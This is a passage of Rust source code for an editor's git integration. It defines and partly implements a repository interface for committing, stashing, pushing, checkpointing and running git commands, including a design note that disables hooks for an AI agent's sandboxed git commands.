    /// Only used to serve `proto::RunGitHook` requests from older remote clients;
    /// new code lets `git commit` run hooks itself.
    ///
    /// TODO: remove together with `proto::RunGitHook` (see the deprecation note in git.proto).
    fn run_hook(
        &self,
        hook: RunHook,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;

    fn commit(
        &self,
        message: SharedString,
        name_and_email: Option<(SharedString, SharedString)>,
        options: CommitOptions,
        askpass: AskPassDelegate,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;

    fn stash_paths(
        &self,
        paths: Vec<RepoPath>,
        message: Option<String>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;

    fn stash_staged(
        &self,
        message: Option<String>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;

    fn stash_pop(
        &self,
        index: Option<usize>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;

    fn stash_apply(
        &self,
        index: Option<usize>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;

    fn stash_drop(
        &self,
        index: Option<usize>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;

    fn push(
        &self,
        branch_name: String,
        remote_branch_name: String,
        upstream_name: String,
        options: Option<PushOptions>,
        askpass: AskPassDelegate,
        env: Arc<HashMap<String, String>>,
        // This method takes an AsyncApp to ensure it's invoked on the main thread,
        // otherwise git-credentials-manager won't work.
        cx: AsyncApp,
    ) -> BoxFuture<'_, Result<RemoteCommandOutput>>;

    fn pull(
        &self,
        branch_name: Option<String>,
        upstream_name: String,
        rebase: bool,
        askpass: AskPassDelegate,
        env: Arc<HashMap<String, String>>,
        // This method takes an AsyncApp to ensure it's invoked on the main thread,
        // otherwise git-credentials-manager won't work.
        cx: AsyncApp,
    ) -> BoxFuture<'_, Result<RemoteCommandOutput>>;

    fn fetch(
        &self,
        fetch_options: FetchOptions,
        askpass: AskPassDelegate,
        env: Arc<HashMap<String, String>>,
        // This method takes an AsyncApp to ensure it's invoked on the main thread,
        // otherwise git-credentials-manager won't work.
        cx: AsyncApp,
    ) -> BoxFuture<'_, Result<RemoteCommandOutput>>;

    fn get_push_remote(&self, branch: String) -> BoxFuture<'_, Result<Option<Remote>>>;

    fn get_branch_remote(&self, branch: String) -> BoxFuture<'_, Result<Option<Remote>>>;

    fn get_all_remotes(&self) -> BoxFuture<'_, Result<Vec<Remote>>>;

    fn remove_remote(&self, name: String) -> BoxFuture<'_, Result<()>>;

    fn create_remote(&self, name: String, url: String) -> BoxFuture<'_, Result<()>>;

    /// returns a list of remote branches that contain HEAD
    fn check_for_pushed_commit(&self) -> BoxFuture<'_, Result<Vec<SharedString>>>;

    /// Run git diff
    fn diff(&self, diff: DiffType) -> BoxFuture<'_, Result<String>>;

    /// Runs one of [`ALLOWED_GIT_COMMANDS`] in the repository, handing back the
    /// raw output rather than failing on a non-zero exit status.
    ///
    /// This is the single escape hatch behind the git panel's merge / hard
    /// reset / patch / history-rewriting operations, so that each of them costs
    /// one typed wrapper on [`crate::repository::GitRepository`] instead of its
    /// own RPC message.
    ///
    /// `env` is the repository's own environment; `command_env` is what the
    /// caller asked for and is validated against [`ALLOWED_GIT_COMMAND_ENV`].
    fn run_command(
        &self,
        args: Vec<String>,
        stdin: Option<String>,
        env: Arc<HashMap<String, String>>,
        command_env: HashMap<String, String>,
    ) -> BoxFuture<'_, Result<GitCommandOutput>>;

    /// [`Self::run_command`] as if the repository were untrusted, whether or not it is: no hook
    /// runs, and neither do the filter, merge, signing or diff programs the repository's own
    /// configuration names (ADR-F90). This is how an AI agent's git commands run, outside its
    /// sandbox: a hook, or a script a hook calls, is a file in the working tree the agent can
    /// write, so running it would run the agent's code outside the sandbox. A git that cannot
    /// turn hooks off (older than 2.9, or of an unknown version) is refused, and a partial
    /// clone's lazy fetch, which would reach the network, is turned off.
    fn run_command_without_hooks(
        &self,
        args: Vec<String>,
        stdin: Option<String>,
        env: Arc<HashMap<String, String>>,
        command_env: HashMap<String, String>,
    ) -> BoxFuture<'_, Result<GitCommandOutput>>;

    fn diff_stat(
        &self,
        diff: DiffStatType,
        path_prefixes: &[RepoPath],
    ) -> BoxFuture<'static, Result<crate::status::GitDiffStat>>;

    /// Creates a checkpoint for the repository.
    fn checkpoint(&self) -> BoxFuture<'static, Result<GitRepositoryCheckpoint>>;

    /// Resets to a previously-created checkpoint.
    fn restore_checkpoint(&self, checkpoint: GitRepositoryCheckpoint) -> BoxFuture<'_, Result<()>>;

    /// Creates two detached commits capturing the current staged and unstaged
    /// state without moving any branch. Returns (staged_sha, unstaged_sha).
    fn create_archive_checkpoint(&self) -> BoxFuture<'_, Result<(String, String)>>;

    /// Restores the working directory and index from archive checkpoint SHAs.
    /// Assumes HEAD is already at the correct commit (original_commit_hash).
    /// Restores the index to match staged_sha's tree, and the working
    /// directory to match unstaged_sha's tree.
    fn restore_archive_checkpoint(
        &self,
        staged_sha: String,
        unstaged_sha: String,
    ) -> BoxFuture<'_, Result<()>>;

    /// Compares two checkpoints, returning true if they are equal
    fn compare_checkpoints(
        &self,
        left: GitRepositoryCheckpoint,
        right: GitRepositoryCheckpoint,
    ) -> BoxFuture<'_, Result<bool>>;

    /// Computes a diff between two checkpoints.
    fn diff_checkpoints(
        &self,
        base_checkpoint: GitRepositoryCheckpoint,
        target_checkpoint: GitRepositoryCheckpoint,
    ) -> BoxFuture<'_, Result<String>>;

    fn load_commit_template(&self) -> BoxFuture<'_, Result<Option<GitCommitTemplate>>>;

    fn default_branch(
        &self,
        include_remote_name: bool,
    ) -> BoxFuture<'_, Result<Option<SharedString>>>;

    /// Runs `git rev-list --parents` to get the commit graph structure.
    /// Returns commit SHAs and their parent SHAs for building the graph visualization.
    fn initial_graph_data(
        &self,
        log_source: LogSource,
        log_order: LogOrder,
        request_tx: Sender<Vec<Arc<InitialGraphCommitData>>>,
    ) -> BoxFuture<'_, Result<()>>;

    fn search_commits(
        &self,
        log_source: LogSource,
        search_args: SearchCommitArgs,
        request_tx: Sender<Oid>,
    ) -> BoxFuture<'_, Result<()>>;

    fn file_history_changed_files(
        &self,
        paths: Vec<RepoPath>,
        commit_limit: usize,
    ) -> BoxFuture<'_, Result<Vec<FileHistoryChangedFileSets>>>;

    fn commit_data_reader(&self) -> Result<CommitDataReader>;

    fn update_ref(&self, ref_name: String, commit: String) -> BoxFuture<'_, Result<()>>;

    fn delete_ref(&self, ref_name: String) -> BoxFuture<'_, Result<()>>;

    fn repair_worktrees(&self) -> BoxFuture<'_, Result<()>>;

    fn set_trusted(&self, trusted: bool);
    fn is_trusted(&self) -> bool;

    /// ForgeKairos (ADR-F93): the git account this repository's commands run as, or `None` to
    /// leave the identity to git's configuration.
    fn set_identity(&self, _identity: Option<Arc<GitIdentity>>) {}
    fn identity(&self) -> Option<Arc<GitIdentity>> {
        None
    }
}

pub enum DiffType {
    HeadToIndex,
    HeadToWorktree,
    MergeBase { base_ref: SharedString },
}

#[derive(Clone, Copy)]
pub enum DiffStatType {
    HeadToIndex,
    HeadToWorktree,
    IndexToWorktree,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize, JsonSchema)]
pub enum PushOptions {
    SetUpstream,
    /// `--force-with-lease`: refuses to overwrite commits the remote gained since the last fetch.
    Force,
    /// Plain `--force`, which overwrites the remote branch whatever it holds. Only reachable from
    /// a menu item that says so and a confirmation prompt.
    ForceWithoutLease,
}

impl PushOptions {
    /// The flag `git push` is given for this.
    pub fn flag(self) -> &'static str {
        match self {
            Self::SetUpstream => "--set-upstream",
            Self::Force => "--force-with-lease",
            Self::ForceWithoutLease => "--force",
        }
    }
}

impl std::fmt::Debug for dyn GitRepository {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("dyn GitRepository<...>").finish()
    }
}

pub struct RealGitRepository {
    pub git_dir: PathBuf,
    pub common_dir: PathBuf,
    /// `None` only for bare repositories, which do not have a working directory.
    pub working_directory: Option<PathBuf>,
    pub system_git_binary_path: Option<PathBuf>,
    pub any_git_binary_path: PathBuf,
    any_git_binary_help_output: Arc<Mutex<Option<SharedString>>>,
    executor: BackgroundExecutor,
    is_trusted: Arc<AtomicBool>,
    identity: Arc<Mutex<Option<Arc<GitIdentity>>>>,
}

#[derive(Debug)]
pub enum RefEdit {
    Update { ref_name: String, commit: String },
    Delete { ref_name: String },
}

impl RefEdit {
    fn into_args(self) -> Vec<OsString> {
        match self {
            Self::Update { ref_name, commit } => {
                vec!["update-ref".into(), ref_name.into(), commit.into()]
            }
            Self::Delete { ref_name } => {
                vec!["update-ref".into(), "-d".into(), ref_name.into()]
            }
        }
    }
}

impl RealGitRepository {
    pub fn new(
        dotgit_path: &Path,
        bundled_git_binary_path: Option<PathBuf>,
        system_git_binary_path: Option<PathBuf>,
        executor: BackgroundExecutor,
    ) -> Result<Self> {
        let any_git_binary_path = system_git_binary_path
            .clone()
            .or(bundled_git_binary_path)
            .context("no git binary available")?;
        log::info!(
            "opening git repository at {dotgit_path:?} using git binary {any_git_binary_path:?}"
        );
        let dotgit_parent = dotgit_path.parent().context(".git has no parent")?;
        let has_working_directory =
            dotgit_path.is_file() || dotgit_path.file_name() == Some(OsStr::new(".git"));
        let working_directory = if has_working_directory {
            Some(normalize_git_metadata_path(dotgit_parent.to_path_buf())?)
        } else {
            None
        };

        let git_dir = if dotgit_path.is_file() {
            let content =
                std::fs::read_to_string(dotgit_path).context("reading .git worktree file")?;
            let path_str = content
                .strip_prefix("gitdir: ")
                .context("expected .git file to start with 'gitdir: '")?
                .trim();
            let resolved = PathBuf::from(path_str);
            let resolved = if resolved.is_absolute() {
                resolved
            } else {
                dotgit_parent.join(resolved)
            };
            normalize_git_metadata_path(resolved)?
        } else {
            normalize_git_metadata_path(dotgit_path.to_path_buf())?
        };

        let common_dir = {
            let commondir_file = git_dir.join("commondir");
            if commondir_file.is_file() {
                let content =
                    std::fs::read_to_string(&commondir_file).context("reading commondir file")?;
                let path_str = content.trim();
                let resolved = PathBuf::from(path_str);
                let resolved = if resolved.is_absolute() {
                    resolved
                } else {
                    git_dir.join(resolved)
                };
                normalize_git_metadata_path(resolved)?
            } else {
                git_dir.clone()
            }
        };

        Ok(Self {
            git_dir,
            common_dir,
            working_directory,
            system_git_binary_path,
            any_git_binary_path,
            executor,
            any_git_binary_help_output: Arc::new(Mutex::new(None)),
            is_trusted: Arc::new(AtomicBool::new(false)),
            identity: Arc::new(Mutex::new(None)),
        })
    }

    fn working_directory(&self) -> Result<PathBuf> {
        self.working_directory
            .clone()
            .context("bare repositories do not have a working directory")
    }

    fn command_directory(&self) -> PathBuf {
        self.working_directory
            .clone()
            .unwrap_or_else(|| self.git_dir.clone())
    }

    fn git_binary_in_worktree(&self) -> Result<GitBinary> {
        Ok(GitBinary::new(
            self.any_git_binary_path.clone(),
            self.working_directory()?,
            self.path(),
            self.executor.clone(),
            self.is_trusted(),
        )
        .with_identity(self.identity()))
    }

    fn git_binary(&self) -> GitBinary {
        GitBinary::new(
            self.any_git_binary_path.clone(),
            self.command_directory(),
            self.path(),
            self.executor.clone(),
            self.is_trusted(),
        )
        .with_identity(self.identity())
    }

    fn edit_ref(&self, edit: RefEdit) -> BoxFuture<'_, Result<()>> {
        let git_binary = self.git_binary();
        self.executor
            .spawn(async move {
                let git = git_binary;
                let args = edit.into_args();
                git.run(&args).await?;
                Ok(())
            })
            .boxed()
    }

    async fn any_git_binary_help_output(&self) -> SharedString {
        if let Some(output) = self.any_git_binary_help_output.lock().clone() {
            return output;
        }
        let git = self.git_binary();
        let output: SharedString = self
            .executor
            .spawn(async move { git.run(&["help", "-a"]).await })
            .await
            .unwrap_or_default()
            .into();
        *self.any_git_binary_help_output.lock() = Some(output.clone());
        output
    }
}

#[derive(Clone, Debug)]
pub struct GitRepositoryCheckpoint {
    pub commit_sha: Oid,
}

#[derive(Debug)]
pub struct GitCommitter {
    pub name: Option<String>,
    pub email: Option<String>,
}

#[derive(Clone, Debug)]
pub struct GitCommitTemplate {
    pub template: String,
}

pub async fn get_git_committer(cx: &AsyncApp) -> GitCommitter {
    if cfg!(any(feature = "test-support", test)) {
        return GitCommitter {
            name: None,
            email: None,
        };
    }

    let git_binary_path =
        if cfg!(target_os = "macos") && option_env!("ZED_BUNDLE").as_deref() == Some("true") {
            cx.update(|cx| {
                cx.path_for_auxiliary_executable("git")
                    .context("could not find git binary path")
                    .log_err()
            })
        } else {
            None
        };

    let git = GitBinary::new(
        git_binary_path.unwrap_or(PathBuf::from("git")),
        paths::home_dir().clone(),
        paths::home_dir().join(".git"),
        cx.background_executor().clone(),
        true,
    );

    cx.background_spawn(async move {
        let name = git
            .run(&["config", "--global", "user.name"])
            .await
            .log_err();
        let email = git
            .run(&["config", "--global", "user.email"])
            .await
            .log_err();
        GitCommitter { name, email }
    })
    .await
}

fn parse_remote_urls(stdout: &str) -> HashMap<String, String> {
    let mut urls = HashMap::default();
    for line in stdout.lines() {
        if let Some((line, suffix)) = line.rsplit_once(" (fetch)")
            && (suffix.is_empty() || suffix.starts_with(" [") && suffix.ends_with(']'))
            && let Some((name, url)) = line.split_once(char::is_whitespace)
        {
            urls.insert(name.to_string(), url.trim_start().to_string());
        }
    }
    urls
}

impl GitRepository for RealGitRepository {
    fn path(&self) -> PathBuf {
        self.git_dir.clone()
    }

    fn main_repository_path(&self) -> PathBuf {
        self.common_dir.clone()
    }

    fn show(&self, commit: String) -> BoxFuture<'_, Result<CommitDetails>> {
        let git = self.git_binary();
        self.executor
            .spawn(async move {
                let suppress_diff = suppress_diff_argument(git.version().await);
                let output = git
                    .build_command(&[
                        "show",
                        suppress_diff,
                        "--format=%H%x00%B%x00%at%x00%ae%x00%an%x00",
                        &commit,
                        // `commit` reaches here as whatever the user typed, so it can name
                        // a branch that also names a path in the working tree.
                        "--",
                    ])
                    .await
                    .output()
                    .await?;
                let output = std::str::from_utf8(&output.stdout)?;
                let fields = output.split('\0').collect::<Vec<_>>();
                if fields.len() != 6 {
                    bail!("unexpected git-show output for {commit:?}: {output:?}")
                }
                let sha = fields[0].to_string().into();
                let message = fields[1].to_string().into();
                let commit_timestamp = fields[2].parse()?;
                let author_email = fields[3].to_string().into();
                let author_name = fields[4].to_string().into();
                Ok(CommitDetails {
                    sha,
                    message,
                    commit_timestamp,
                    author_email,
                    author_name,
                })
            })
            .boxed()
    }

    fn load_commit(
        &self,
        commit: String,
        ignore_shallow_boundary: bool,
        cx: AsyncApp,
    ) -> BoxFuture<'_, Result<CommitDiff>> {
        let git = self.git_binary();
        let shallow_file_path = self.common_dir.join("shallow");
        cx.background_spawn(async move {
            let version = git.version().await;
            if !ignore_shallow_boundary
                && is_shallow_boundary_commit(&git, &shallow_file_path, &commit).await?
            {
                return Ok(CommitDiff {
                    files: Vec::new(),
                    is_shallow_boundary: true,
                });
            }

            let show_output = git
                .build_command(commit_diff_args(version))
                .await
                .arg(&commit)
                .arg("--")
                .stdin(Stdio::null())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .output()
                .await
                .context("starting git show process")?;
            anyhow::ensure!(
                show_output.status.success(),
                "git show failed: {}",
                String::from_utf8_lossy(&show_output.stderr)
            );

            let show_stdout = String::from_utf8_lossy(&show_output.stdout);
            let changes = parse_git_diff_raw(&show_stdout);

            let mut cat_file_process = git
                .build_command(&["cat-file", cat_file_blob_batch_argument(version)])
                .await
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .context("starting git cat-file process")?;

            let mut files = Vec::<CommitFile>::new();
            let stdin = cat_file_process
                .stdin
                .take()
                .context("git cat-file process has no stdin")?;
            let stdout = cat_file_process
                .stdout
                .take()
                .context("git cat-file process has no stdout")?;
            let mut stdin = BufWriter::with_capacity(512, stdin);
            let mut stdout = BufReader::new(stdout);
            let mut info_line = String::new();
            let mut newline = [b'\0'];
            for change in changes {
                let change = change?;
                let path = change.path;
                // git-show outputs `/`-delimited paths even on Windows.
                let Some(rel_path) = RelPath::from_unix_str(path).log_err() else {
                    continue;
                };

                let objects = [change.new_object, change.old_object];
                let mut has_blobs = false;
                for object in objects.iter().flatten() {
                    if object.kind == CommitDiffObjectKind::Blob {
                        stdin.write_all(object.oid.as_bytes()).await?;
                        stdin.write_all(b"\n").await?;
                        has_blobs = true;
                    }
                }
                if has_blobs {
                    stdin.flush().await?;
                }

                let [new_object, old_object] = objects;
                let new_object =
                    load_commit_object(new_object, &mut stdout, &mut info_line, &mut newline)
                        .await?;
                let old_object =
                    load_commit_object(old_object, &mut stdout, &mut info_line, &mut newline)
                        .await?;
                let is_binary = new_object.as_ref().is_some_and(|object| object.is_binary)
                    || old_object.as_ref().is_some_and(|object| object.is_binary);
                let new_content = new_object.map(|object| object.content);
                let old_content = old_object.map(|object| object.content);

                files.push(CommitFile {
                    path: RepoPath(Arc::from(rel_path)),
                    old_content,
                    new_content,
                    is_binary,
                })
            }

            Ok(CommitDiff {
                files,
                is_shallow_boundary: false,
            })
        })
        .boxed()
    }

    fn reset(
        &self,
        commit: String,
        mode: ResetMode,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        async move {
            let git = git?;
            let mode_flag = match mode {
                ResetMode::Mixed => "--mixed",
                ResetMode::Soft => "--soft",
                ResetMode::Hard => "--hard",
            };

            let output = git
                .build_command(&["reset", mode_flag, &commit])
                .await
                .envs(env.iter())
                .output()
                .await?;
            anyhow::ensure!(
                output.status.success(),
                "Failed to reset:\n{}",
                String::from_utf8_lossy(&output.stderr),
            );
            Ok(())
        }
        .boxed()
    }

    fn checkout_files(
        &self,
        commit: String,
        paths: Vec<RepoPath>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        async move {
            let git = git?;
            if paths.is_empty() {
                return Ok(());
            }
            git.ensure_hooks_are_disabled_if_untrusted(i18n::tc!("git result", "Restore files"))
                .await?;

            let output = git
                .build_command(&["checkout", &commit, "--"])
                .await
                .envs(env.iter())
                .args(paths.iter().map(|path| path.as_unix_str()))
                .output()
                .await?;
            anyhow::ensure!(
                output.status.success(),
                "Failed to checkout files:\n{}",
                String::from_utf8_lossy(&output.stderr),
            );
            Ok(())
        }
        .boxed()
    }

    fn load_blob_content(&self, oid: Oid) -> BoxFuture<'_, Result<Vec<u8>>> {
        let git_binary = self.git_binary();
        let oid_str = oid.to_string();
        self.executor
            .spawn(async move {
                let mut command = git_binary
                    .build_command(&["cat-file", "blob", &oid_str])
                    .await;
                let output = command.output().await?;
                anyhow::ensure!(
                    output.status.success(),
                    GitBinaryCommandError {
                        stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                        stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                        status: output.status,
                    }
                );
                Ok(output.stdout)
            })
            .boxed()
    }

    fn load_commit_template(&self) -> BoxFuture<'_, Result<Option<GitCommitTemplate>>> {
        let working_directory = self.working_directory();
        let git_binary = self.git_binary_in_worktree();

        self.executor
            .spawn(async move {
                let working_directory = working_directory?;
                let git_binary = git_binary?;
                let output = git_binary
                    .build_command(&["config", "--get", "commit.template"])
                    .await
                    .output()
                    .await
                    .context("failed to run git config --get commit.template")?;

                let raw_path = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if !output.status.success() || raw_path.is_empty() {
                    return Ok(None);
                }

                let path = PathBuf::from(&raw_path);
                let path = if let Some(path) = raw_path.strip_prefix("~/") {
                    paths::home_dir().join(path)
                } else if path.is_relative() {
                    working_directory.join(path)
                } else {
                    path
                };

                let template = match std::fs::read_to_string(&path) {
                    Ok(s) if !s.trim().is_empty() => Some(s),
                    Err(err) => {
                        log::warn!("failed to read commit template {}: {}", path.display(), err);
                        None
                    }
                    _ => None,
                };

                Ok(template.map(|template| GitCommitTemplate { template }))
            })
            .boxed()
    }

    fn set_index_text(
        &self,
        path: RepoPath,
        content: Option<Vec<u8>>,
        env: Arc<HashMap<String, String>>,
        is_executable: bool,
    ) -> BoxFuture<'_, anyhow::Result<()>> {
        let git = self.git_binary();
        self.executor
            .spawn(async move {
                let mode = if is_executable { "100755" } else { "100644" };

                if let Some(content) = content {
                    let mut child = git
                        .build_command(&[
                            "hash-object",
                            "-w",
                            "--stdin",
                            "--path",
                            path.as_unix_str(),
                        ])
                        .await
                        .envs(env.iter())
                        .stdin(Stdio::piped())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .spawn()?;
                    let mut stdin = child.stdin.take().context("hash-object has no stdin")?;
                    stdin.write_all(&content).await?;
                    stdin.flush().await?;
                    drop(stdin);
                    let output = child.output().await?;
                    anyhow::ensure!(
                        output.status.success(),
                        GitBinaryCommandError {
                            stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                            stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                            status: output.status,
                        }
                    );
                    let sha = str::from_utf8(&output.stdout)?.trim();

                    log::debug!("indexing SHA: {sha}, path {path:?}");

                    let output = git
                        .build_command(&["update-index", "--add", "--cacheinfo", mode, sha])
                        .await
                        .envs(env.iter())
                        .arg(path.as_unix_str())
                        .output()
                        .await?;

                    anyhow::ensure!(
                        output.status.success(),
                        "Failed to stage:\n{}",
                        String::from_utf8_lossy(&output.stderr)
                    );
                } else {
                    log::debug!("removing path {path:?} from the index");
                    let output = git
                        .build_command(&["update-index", "--force-remove", "--"])
                        .await
                        .envs(env.iter())
                        .arg(path.as_unix_str())
                        .output()
                        .await?;
                    anyhow::ensure!(
                        output.status.success(),
                        "Failed to unstage:\n{}",
                        String::from_utf8_lossy(&output.stderr)
                    );
                }

                Ok(())
            })
            .boxed()
    }

    fn remote_urls(&self) -> BoxFuture<'_, HashMap<String, String>> {
        let git = self.git_binary();
        self.executor
            .spawn(async move {
                if let Ok(stdout) = git.run(&["remote", "-v"]).await {
                    parse_remote_urls(&stdout)
                } else {
                    HashMap::default()
                }
            })
            .boxed()
    }

    fn revparse_batch(&self, revs: Vec<String>) -> BoxFuture<'_, Result<Vec<Option<String>>>> {
        let git = self.git_binary();
        self.executor
            .spawn(async move {
                let has_object_name_format =
                    GitFeature::CatFileBatchFormat.is_supported_by(git.version().await);
                let batch_check = if has_object_name_format {
                    "--batch-check=%(objectname)"
                } else {
                    "--batch-check"
                };
                let mut process = git
                    .build_command(&["cat-file", batch_check])
                    .await
                    .stdin(Stdio::piped())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .spawn()?;

                let stdin = process
                    .stdin
                    .take()
                    .context("no stdin for git cat-file subprocess")?;
                let mut stdin = BufWriter::new(stdin);
                for rev in &revs {
                    stdin.write_all(rev.as_bytes()).await?;
                    stdin.write_all(b"\n").await?;
                }
                stdin.flush().await?;
                drop(stdin);

                let output = process.output().await?;
                let output = std::str::from_utf8(&output.stdout)?;
                let shas = output
                    .lines()
                    .map(|line| {
                        if line.ends_with("missing") {
                            None
                        } else if has_object_name_format {
                            Some(line.to_string())
                        } else {
                            // The default format is `<object> <type> <size>`.
                            line.split(' ').next().map(str::to_string)
                        }
                    })
                    .collect::<Vec<_>>();

                if shas.len() != revs.len() {
                    // In an octopus merge, git cat-file still only outputs the first sha from MERGE_HEAD.
                    bail!("unexpected number of shas")
                }

                Ok(shas)
            })
            .boxed()
    }

    fn load_revisions(
        &self,
        revisions: Vec<String>,
    ) -> BoxFuture<'_, Result<Vec<Option<Vec<u8>>>>> {
        let git = self.git_binary();
        self.executor
            .spawn(async move {
                if revisions.is_empty() {
                    return Ok(Vec::new());
                }
                if let Some(revision) = revisions.iter().find(|revision| revision.contains('\n')) {
                    anyhow::bail!(
                        "revision spec {revision:?} contains a newline and cannot be passed to git cat-file --batch"
                    );
                }

                let mut process = git
                    .build_command(&["cat-file", "--batch"])
                    .await
                    .stdin(Stdio::piped())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .kill_on_drop(true)
                    .spawn()?;

                let mut stdin = BufWriter::new(process.stdin.take().context("no stdin")?);
                let mut stdout = BufReader::new(process.stdout.take().context("no stdout")?);
                let mut newline = [0u8; 1];

                let mut header_bytes = Vec::new();
                let mut results = Vec::with_capacity(revisions.len());
                for rev in &revisions {
                    stdin.write_all(rev.as_bytes()).await?;
                    stdin.write_all(b"\n").await?;
                    stdin.flush().await?;

                    header_bytes.clear();
                    stdout.read_until(b'\n', &mut header_bytes).await?;
                    let header_line = String::from_utf8_lossy(&header_bytes);

                    let parts: Vec<&str> = header_line.trim().split(' ').collect();
                    match parts[..] {
                        [.., "missing"] => {
                            results.push(None);
                        }
                        [_, object_type, size_str] => {
                            let size: usize = size_str
                                .parse()
                                .with_context(|| format!("invalid object size: {size_str}"))?;

                            let mut content = vec![0u8; size];
                            stdout.read_exact(&mut content).await?;
                            stdout.read_exact(&mut newline).await?;

                            if object_type == "blob" {
                                results.push(Some(content));
                            } else {
                                results.push(None);
                            }
                        }
                        _ => bail!("invalid cat-file header: {header_line}"),
                    }
                }

                drop(stdin);
                process.output().await?;
                Ok(results)
            })
            .boxed()
    }

    fn merge_message(&self) -> BoxFuture<'_, Option<String>> {
        let path = self.path().join("MERGE_MSG");
        self.executor
            .spawn(async move { std::fs::read_to_string(&path).ok() })
            .boxed()
    }

    fn status(
        &self,
        path_prefixes: &[RepoPath],
        untracked_files: StatusUntrackedFiles,
    ) -> Task<Result<GitStatus>> {
        let git = self.git_binary_in_worktree();
        let path_prefixes = path_prefixes.to_vec();
        log::debug!("Checking for git status in {path_prefixes:?}");
        self.executor.spawn(async move {
            let git = git?;
            let args = git_status_args(&path_prefixes, untracked_files, git.version().await);
            let output = git.build_command(&args).await.output().await?;
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                stdout.parse()
            } else {
                let stderr = String::from_utf8_lossy(&output.stderr);
                anyhow::bail!("git status failed: {stderr}");
            }
        })
    }

    fn check_access(&self) -> BoxFuture<'_, Result<()>> {
        let git = self.git_binary_in_worktree();
        self.executor
            .spawn(async move {
                git?.run(&["rev-parse"]).await?;
                Ok(())
            })
            .boxed()
    }

    fn diff_tree(&self, request: DiffTreeType) -> BoxFuture<'_, Result<TreeDiff>> {
        let git = self.git_binary_in_worktree();
        let working_directory = self.working_directory.clone();
        let merge_base_ref = match &request {
            DiffTreeType::MergeBaseWithWorktree { base } => Some(base.clone()),
            DiffTreeType::MergeBase { .. } | DiffTreeType::Since { .. } => None,
        };

        self.executor
            .spawn(async move {
                let git = git?;
                let resolved_merge_base =
                    if GitFeature::DiffMergeBase.is_supported_by(git.version().await) {
                        None
                    } else {
                        match &request {
                            DiffTreeType::MergeBase { base, head } => {
                                Some(resolve_merge_base(&git, base, head).await?)
                            }
                            DiffTreeType::MergeBaseWithWorktree { base } => {
                                Some(resolve_merge_base(&git, base, "HEAD").await?)
                            }
                            DiffTreeType::Since { .. } => None,
                        }
                    };
                let args = diff_tree_args(&request, resolved_merge_base.as_deref());
                let output = git.build_command(&args).await.output().await?;
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    anyhow::bail!("git diff-tree failed: {stderr}");
                }

                let stdout = String::from_utf8_lossy(&output.stdout);
                let mut tree_diff = stdout.parse::<TreeDiff>()?;
                let Some(merge_base_ref) = merge_base_ref else {
                    return Ok(tree_diff);
                };
                let Some(working_directory) = working_directory else {
                    return Ok(tree_diff);
                };
                if !tree_diff
                    .entries
                    .values()
                    .any(|status| matches!(status, TreeDiffStatus::Deleted { .. }))
                {
                    return Ok(tree_diff);
                }

                // Untracked files must be listed exhaustively here: the point of
                // this call is to tell apart deletions from files that were
                // deleted and recreated, and a recreated file inside an
                // untracked directory would otherwise go unreported.
                let status_args =
                    git_status_args(&[], StatusUntrackedFiles::All, git.version().await);
                let status_output = git.build_command(&status_args).await.output().await?;
                if !status_output.status.success() {
                    let stderr = String::from_utf8_lossy(&status_output.stderr);
                    anyhow::bail!("git status failed: {stderr}");
                }
                let status = String::from_utf8_lossy(&status_output.stdout).parse::<GitStatus>()?;
                // Files the diff reports as deleted but that exist on disk
                // (deleted from the index or from a commit, then recreated).
                // `git diff` compares them against the index, so compare their
                // disk contents against the merge base ourselves.
                let recreated: Vec<(RepoPath, Oid)> = status
                    .entries
                    .iter()
                    .filter(|(_, status)| {
                        matches!(
                            *status,
                            FileStatus::Untracked
                                | FileStatus::Tracked(TrackedStatus {
                                    index_status: StatusCode::Deleted,
                                    worktree_status: StatusCode::Added,
                                })
                        )
                    })
                    .filter_map(|(path, _)| match tree_diff.entries.get(path) {
                        Some(TreeDiffStatus::Deleted { old }) => Some((path.clone(), *old)),
                        _ => None,
                    })
                    .collect();
                if recreated.is_empty() {
                    return Ok(tree_diff);
                }

                let merge_base = match resolved_merge_base {
                    Some(merge_base) => merge_base,
                    None => resolve_merge_base(&git, merge_base_ref.as_ref(), "HEAD").await?,
                };
                let merge_base = merge_base.as_str();

                for (path, old) in recreated {
                    let full_path = working_directory.join(path.as_std_path());
                    let metadata = match smol::fs::symlink_metadata(&full_path).await {
                        Ok(metadata) => metadata,
                        Err(_) => continue,
                    };
                    let base_entry = git
                        .build_command(
                            &["ls-tree", merge_base, "--", path.as_unix_str()].map(OsString::from),
                        )
                        .await
                        .output()
                        .await?;
                    if !base_entry.status.success() {
                        continue;
                    }
                    let base_mode = String::from_utf8_lossy(&base_entry.stdout);
                    let Some(base_mode) = base_mode.split_ascii_whitespace().next() else {
                        continue;
                    };
                    let current_mode = if metadata.file_type().is_symlink() {
                        "120000"
                    } else {
                        #[cfg(unix)]
                        {
                            use std::os::unix::fs::PermissionsExt as _;
                            if metadata.permissions().mode() & 0o111 == 0 {
